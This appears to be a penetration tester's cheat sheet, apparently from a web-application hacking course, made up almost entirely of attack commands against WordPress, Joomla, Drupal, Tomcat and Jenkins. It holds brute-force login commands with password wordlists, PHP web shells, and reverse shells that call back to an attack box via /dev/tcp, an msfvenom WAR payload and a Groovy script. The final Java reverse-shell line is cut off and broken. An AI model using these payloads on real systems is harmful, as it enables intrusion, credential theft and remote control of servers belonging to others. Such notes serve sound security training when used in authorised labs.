```
sudo vim /etc/hosts
sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>
cat web_discovery.xml | ./aquatone -nmap
sudo wpscan --url <http://domainnameoripaddress> --enumerate
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>
curl -s http://<hostnameoripoftargetsite/path/to/webshell.php?cmd=id
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'");
droopescan scan joomla --url http://<domainnameoripaddress>
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <username or path to username list>
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
curl -s <http://domainname or IP address of site> /node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
gobuster dir -u <http://domainnameoripaddressofsite> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
auxiliary/scanner/http/tomcat_mgr_login
python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address of attack box> LPORT=<port to listen on to catch a shell> -f war > backup.war
nmap -sV -p 8009,8080 <domainname or IP address of tomcat site>
r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()
def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");
String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);
```
- https://github.com/0xjpuff/reverse_shell_splunk
